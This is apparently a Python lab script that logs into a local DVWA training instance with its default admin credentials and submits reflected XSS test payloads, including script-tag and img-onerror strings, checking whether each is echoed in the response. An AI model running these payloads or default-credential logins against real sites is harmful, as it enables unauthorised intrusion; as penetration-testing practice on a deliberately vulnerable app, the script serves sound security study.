import requests
from bs4 import BeautifulSoup

session = requests.Session()

# Login
print('Authenticating...')
resp = session.get('http://localhost/dvwa/login.php')
soup = BeautifulSoup(resp.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'user_token'}).get('value')

session.post('http://localhost/dvwa/login.php', data={
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': csrf_token
})
print('✓ Authenticated')

# Get the XSS page to extract CSRF token
print('\nGetting XSS form...')
xss_page_resp = session.get('http://localhost/dvwa/vulnerabilities/xss_r/')
soup = BeautifulSoup(xss_page_resp.text, 'html.parser')

# Find the CSRF token on the XSS form
xss_form = soup.find('form')
csrf_input = soup.find('input', {'name': 'user_token'})
xss_csrf = csrf_input.get('value') if csrf_input else None
print(f'XSS form CSRF token: {xss_csrf}')

# Test POST request with payload
print('\nTesting XSS with POST submission...')
payloads = [
    '<marker>',
    '"><script>alert(1)</script>',
    '<img src=x onerror="alert(1)">',
    'xsstest123',
]

for payload in payloads:
    post_data = {
        'name': payload,
        'user_token': xss_csrf,
        'Submit': 'Submit'
    }
    
    resp = session.post('http://localhost/dvwa/vulnerabilities/xss_r/', data=post_data)
    
    found = payload in resp.text
    print(f'\nPayload: {payload[:40]}')
    print(f'  Reflected: {found}')
    
    if found:
        idx = resp.text.find(payload)
        start = max(0, idx - 100)
        end = min(len(resp.text), idx + 200)
        snippet = resp.text[start:end]
        print(f'  Context: ...{snippet}...')
